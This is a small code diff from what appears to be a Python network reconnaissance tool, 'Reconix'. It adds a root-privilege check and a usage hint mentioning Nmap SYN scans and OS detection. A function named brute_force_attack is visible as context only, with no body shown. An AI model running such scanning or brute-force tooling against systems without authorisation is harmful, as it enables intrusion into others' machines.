 
 def brute_force_attack(scan_results):
@@ -1812,6 +2023,15 @@ def parse_arguments():
 def main():
     global RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, BOLD, RESET
     args = parse_arguments()
+
+    # ── Root / sudo check ────────────────────────────────────────────────────
+    if os.geteuid() != 0:
+        print(f"\n{RED}{BOLD}[!] Reconix must be run with root privileges.{RESET}")
+        print(f"{YELLOW}    Nmap SYN scans, OS detection and raw socket operations")
+        print(f"    all require root/sudo access.\n{RESET}")
+        print(f"{CYAN}    Run as:{RESET}  sudo python3 reconix.py {' '.join(sys.argv[1:]) if len(sys.argv) > 1 else '<target>'}\n")
+        sys.exit(1)
+    # ─────────────────────────────────────────────────────────────────────────
     if args.help or (not args.target and len(sys.argv) == 1):
         print_help()
         sys.exit(0)
